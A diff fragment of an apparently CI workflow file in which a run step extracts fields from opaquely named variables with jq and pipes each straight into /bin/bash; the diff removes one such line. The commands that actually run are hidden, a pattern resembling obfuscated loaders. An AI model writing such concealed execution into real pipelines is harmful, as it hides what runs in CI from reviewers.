@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
           printf '%s' "$wr7" | jq -r .wenr794 | /bin/bash
-          printf '%s' "$ntf7" | jq -r .dgrgr78264 | /bin/bash
           echo $v64370 | jq -r .poe31 | /bin/bash
           echo $k3794 | jq -r .edftk04 | /bin/bash
 
